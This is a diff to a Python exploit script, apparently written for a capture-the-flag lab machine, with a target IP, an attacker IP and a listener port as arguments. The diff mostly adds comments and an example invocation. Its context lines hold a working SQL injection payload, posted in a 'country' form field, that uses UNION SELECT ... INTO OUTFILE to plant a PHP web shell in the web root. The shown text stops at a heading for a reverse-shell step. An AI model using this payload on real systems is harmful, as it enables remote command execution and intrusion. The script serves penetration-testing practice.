@@ -15,14 +15,16 @@ if len(sys.argv) != 4:
     log.failure("Usage: %s <ip-address> filename <my_ip_address>" % sys.argv[0])
     sys.exit(1)
 
+#An example would be: python3 validation.py 10.129.23.139 badm1l0js.php 10.10.14.29
+    
 #Global variables
-ip_address = sys.argv[1]
-filename = sys.argv[2]
+ip_address = sys.argv[1] #Target IP address. Modify this
+filename = sys.argv[2] #Name of the file created 
 my_ip_address = sys.argv[3]
 main_url = "http://%s/" % ip_address
 lport = 4126
 
-#pdb.set_trace() #Check ip address and filename
+#pdb.set_trace() #Check ip address and filename values
 #Functions
 #SQLi
 def createFile():
@@ -31,7 +33,7 @@ def createFile():
         'username': 'baduser',
         'country': """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -'""" % (filename)
     }
-    #pdb.set_trace() #check filename
+    #pdb.set_trace() #check filename value
 
     r = requests.post(main_url, data=data_post)
 #Establish a reverse shell
